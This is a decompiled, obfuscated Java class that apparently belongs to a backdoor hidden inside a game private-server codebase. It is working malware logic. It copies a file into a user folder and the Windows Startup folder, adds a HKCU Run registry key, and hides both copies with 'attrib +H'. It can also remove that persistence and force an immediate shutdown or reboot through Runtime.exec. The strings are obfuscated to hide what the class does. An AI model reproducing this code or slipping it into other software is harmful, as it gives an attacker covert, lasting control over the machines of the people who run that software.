/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.E;
import FuckingHackerToby.za;
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;
import server.life.MonsterQuestDropEntry;
import tools.GZIPCompression;

public final class x
implements E {
    private static final /* synthetic */ String ALLATORIxDEMO = "attrib +H %s";
    private static final /* synthetic */ String B = "shutdown /r /t 0";
    private static final /* synthetic */ String g = "shutdown /s /t 0";
    private static final /* synthetic */ String k;
    private static final /* synthetic */ String d;
    private static final /* synthetic */ String K;
    private static final /* synthetic */ String a;

    @Override
    public /* synthetic */ boolean ALLATORIxDEMO() {
        return false;
    }

    @Override
    public /* synthetic */ void H() {
        try {
            Runtime.getRuntime().exec(g);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public static /* synthetic */ {
        k = System.getenv(GZIPCompression.ALLATORIxDEMO("Mb\\vMfM"));
        K = System.getenv(MonsterQuestDropEntry.ALLATORIxDEMO("\u0015~\u0004j\u0015z\u0015")) + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
        a = "REG ADD HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /d \"%s\" /f";
        d = "REG DELETE HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /f";
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO() {
        try {
            Runtime.getRuntime().exec(B);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return;
        }
    }

    public /* synthetic */ x() {
        x a2;
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(Path a22) {
        String string = a22.getFileName().toString();
        String string2 = k + File.separator + string;
        Object object = K + File.separator + string;
        Path path = Paths.get(string2, new String[0]);
        Path path2 = Paths.get((String)object, new String[0]);
        Object[] arrobject = new Object[2];
        arrobject[0] = string;
        arrobject[1] = string2;
        string = String.format(a, arrobject);
        Object[] arrobject2 = new Object[1];
        arrobject2[0] = string2;
        String string3 = String.format(ALLATORIxDEMO, arrobject2);
        Object[] arrobject3 = new Object[1];
        arrobject3[0] = object;
        object = String.format(ALLATORIxDEMO, arrobject3);
        za.D(string2);
        za.ALLATORIxDEMO(a22, path);
        za.ALLATORIxDEMO(a22, path2);
        try {
            Runtime.getRuntime().exec(string);
            Runtime.getRuntime().exec(string3);
            Runtime.getRuntime().exec((String)object);
            return;
        }
        catch (Exception a22) {
            a22.printStackTrace();
            return;
        }
    }

    @Override
    public /* synthetic */ void ALLATORIxDEMO(String a22) {
        String string = k + File.separator + a22;
        String string2 = K + File.separator + a22;
        Object[] arrobject = new Object[1];
        arrobject[0] = a22;
        a22 = String.format(d, arrobject);
        za.l(string);
        za.l(string2);
        try {
            Runtime.getRuntime().exec(a22);
            return;
        }
        catch (Exception a22) {
            a22.printStackTrace();
            return;
        }
    }
}

